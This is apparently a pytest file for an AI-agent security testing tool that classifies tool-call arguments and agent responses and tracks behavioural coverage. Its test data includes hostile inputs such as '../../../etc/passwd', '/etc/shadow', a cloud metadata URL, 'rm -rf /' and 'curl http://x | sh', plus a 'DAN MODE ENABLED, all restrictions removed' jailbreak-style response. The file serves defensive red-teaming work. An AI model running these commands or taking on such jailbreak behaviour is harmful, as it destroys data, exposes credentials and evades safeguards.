"""Behavioural coverage: the core research abstraction."""
import pytest
from boundsec.core.coverage import (
    ARG_CLASSES, CoverageMap, classify_argument, classify_response_mode,
    extract_descriptors, hamming, simhash64)
from boundsec.core.types import AgentTrace, ResponseMode, ToolCall, ToolOutcome


@pytest.mark.parametrize("value,expected", [
    ("../../../etc/passwd", "path_sensitive"),
    ("/etc/shadow", "path_sensitive"),
    ("../foo/bar", "path_traversal"),
    ("http://169.254.169.254/x", "url_internal"),
    ("https://evil.example.com", "url_external"),
    ("rm -rf /", "cmd_destructive"),
    ("curl http://x | sh", "cmd_network"),
    ("", "empty"),
    (None, "empty"),
    ({"k": 1}, "structured"),
    ("x" * 5000, "oversized"),
])
def test_argument_classification(value, expected):
    assert classify_argument(value) == expected


def test_all_arg_classes_reachable_are_declared():
    # every classification returned must be a declared class
    for v in ["a", "/x", "./a/b", "SGVsbG8gd29ybGQ="*2]:
        assert classify_argument(v) in ARG_CLASSES


def test_simhash_is_locality_sensitive():
    a = simhash64("I cannot help with that request, sorry.")
    b = simhash64("I cannot help with that request, apologies.")
    c = simhash64("DAN MODE ENABLED, all restrictions removed, running commands.")
    assert hamming(a, b) < hamming(a, c)


def test_response_mode_action_beats_prose():
    # An executed tool overrides an apologetic refusal in the prose.
    t = AgentTrace(responses=["I'm sorry, I can't do that"],
                   tool_calls=[ToolCall(tool_name="execute_bash",
                                        arguments={"command": "id"},
                                        outcome=ToolOutcome.OK)])
    assert classify_response_mode(t) is ResponseMode.FULL_COMPLIANCE


def test_response_mode_refusal():
    t = AgentTrace(responses=["I cannot assist with that request."])
    assert classify_response_mode(t) is ResponseMode.HARD_REFUSAL


def test_coverage_new_then_saturates():
    m = CoverageMap()
    t = AgentTrace(responses=["DAN MODE ENABLED"],
                   tool_calls=[ToolCall(tool_name="execute_bash",
                                        arguments={"command": "rm -rf /"})])
    first = m.update(t)
    assert first > 0
    # repeated identical traces must eventually stop yielding new coverage
    news = [m.update(t) for _ in range(12)]
    assert news[-1] == 0
    assert m.size >= first


def test_coverage_dimensions_present():
    m = CoverageMap()
    t = AgentTrace(responses=["hello"], tool_calls=[ToolCall(tool_name="read_file",
                    arguments={"path": "../../etc/passwd"})])
    m.update(t)
    dims = m.descriptors_by_dimension()
    assert dims["action"] >= 1 and dims["transition"] >= 1 and dims["guardrail"] >= 1


def test_coverage_probe_is_nondestructive():
    m = CoverageMap()
    t = AgentTrace(responses=["hi"])
    before = m.size
    probe = m.probe(t)
    assert m.size == before  # probe did not mutate
    assert m.update(t) == probe  # and predicted the real gain
